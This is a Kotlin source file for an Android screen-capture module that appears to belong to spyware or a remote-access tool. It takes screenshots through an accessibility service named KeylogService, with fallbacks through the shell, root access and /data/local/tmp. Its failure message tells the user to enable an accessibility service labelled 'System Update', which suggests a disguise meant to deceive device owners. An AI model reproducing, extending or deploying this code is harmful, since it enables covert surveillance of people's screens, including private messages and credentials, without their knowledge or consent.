package com.openaccess.sdk.service

import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build

import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.TimeUnit

class ScreenshotModule(private val context: android.content.Context) {

    companion object {
        private const val TAG = "ScreenshotModule"
        private const val QUALITY = 85
        private const val MAX_DIM = 1920
    }

    interface Callback {
        fun onSuccess(data: ByteArray)
        fun onFailure(error: String)
    }

    fun capture(callback: Callback) {
        

        // 1. AccessibilityService screenshot (Android 14+) — most reliable
        if (Build.VERSION.SDK_INT >= 34) {
            
            val svc = KeylogService.instance
            if (svc != null) {
                captureAccessibility(callback)
                return
            }
            
        }

        // 2. Direct screencap via stdout pipe
        
        val directResult = captureDirect()
        if (directResult != null) {
            val processed = processBytes(directResult)
            if (processed != null) { callback.onSuccess(processed); return }
        }

        // 3. Root screencap
        
        val rootResult = captureRoot()
        if (rootResult != null) {
            val processed = processBytes(rootResult)
            if (processed != null) { callback.onSuccess(processed); return }
        }

        // 4. Screencap via /data/local/tmp (emulator workaround)
        
        val tmpResult = captureViaTmp()
        if (tmpResult != null) {
            val processed = processBytes(tmpResult)
            if (processed != null) { callback.onSuccess(processed); return }
        }

        val hint = if (Build.VERSION.SDK_INT >= 34) {
            "Enable Accessibility: Settings → Accessibility → System Update → ON"
        } else {
            "Requires root. Enable root in AVD settings or use Android 14+ with Accessibility"
        }
        callback.onFailure("Screenshot failed. $hint")
    }

    private fun captureDirect(): ByteArray? {
        return try {
            val proc = ProcessBuilder("sh", "-c", "screencap -p")
                .redirectErrorStream(true)
                .start()
            val ok = proc.waitFor(10, TimeUnit.SECONDS)
            if (!ok) { proc.destroyForcibly(); return null }
            if (proc.exitValue() != 0) return null
            val bytes = proc.inputStream.readBytes()
            if (bytes.isEmpty() || bytes.size < 100) return null
            
            bytes
        } catch (e: Exception) {
            
            null
        }
    }

    private fun captureRoot(): ByteArray? {
        return try {
            val proc = ProcessBuilder("su", "-c", "screencap -p")
                .redirectErrorStream(true)
                .start()
            val ok = proc.waitFor(10, TimeUnit.SECONDS)
            if (!ok) { proc.destroyForcibly(); return null }
            if (proc.exitValue() != 0) return null
            val bytes = proc.inputStream.readBytes()
            if (bytes.isEmpty() || bytes.size < 100) return null
            
            bytes
        } catch (e: Exception) {
            
            null
        }
    }

    private fun captureViaTmp(): ByteArray? {
        return try {
            val tmpFile = File("/data/local/tmp/screen_${System.currentTimeMillis()}.png")
            val proc = ProcessBuilder("sh", "-c", "screencap -p ${tmpFile.absolutePath}")
                .redirectErrorStream(true)
                .start()
            val ok = proc.waitFor(10, TimeUnit.SECONDS)
            if (!ok || proc.exitValue() != 0) {
                proc.destroyForcibly()
                return null
            }
            if (!tmpFile.exists() || tmpFile.length() == 0L) return null
            val bytes = tmpFile.readBytes()
            tmpFile.delete()
            if (bytes.isEmpty() || bytes.size < 100) return null
            
            bytes
        } catch (e: Exception) {
            
            null
        }
    }

    private fun captureAccessibility(callback: Callback) {
        val svc = KeylogService.instance ?: run {
            callback.onFailure("AccessibilityService not running")
            return
        }
        if (Build.VERSION.SDK_INT < 34) {
            callback.onFailure("Accessibility screenshot requires Android 14+")
            return
        }
        // Call the service's takeScreenshot directly with callback
        val exec = java.util.concurrent.Executors.newSingleThreadExecutor()
        try {
            svc.takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                exec,
                object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                        try {
                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
                            if (bitmap == null) { callback.onFailure("Bitmap wrap failed"); return }
                            val bytes = java.io.ByteArrayOutputStream()
                            bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, bytes)
                            bitmap.recycle()
                            callback.onSuccess(bytes.toByteArray())
                        } catch (e: Exception) {
                            callback.onFailure("Accessibility: ${e.message}")
                        } finally {
                            exec.shutdown()
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        callback.onFailure("Accessibility screenshot failed: code=$errorCode")
                        exec.shutdown()
                    }
                }
            )
        } catch (e: Exception) {
            callback.onFailure("Accessibility: ${e.message}")
            exec.shutdown()
        }
    }

    private fun processBytes(data: ByteArray): ByteArray? {
        return try {
            val bmp = BitmapFactory.decodeByteArray(data, 0, data.size) ?: return data
            val w = bmp.width; val h = bmp.height
            val resized = if (w > MAX_DIM || h > MAX_DIM) {
                val r = MAX_DIM.toFloat() / maxOf(w, h)
                Bitmap.createScaledBitmap(bmp, (w * r).toInt(), (h * r).toInt(), true)
                    .also { if (it !== bmp) bmp.recycle() }
            } else bmp
            val out = ByteArrayOutputStream()
            resized.compress(Bitmap.CompressFormat.JPEG, QUALITY, out)
            if (resized !== bmp) resized.recycle()
            out.toByteArray()
        } catch (e: Exception) {
            
            data
        }
    }
}
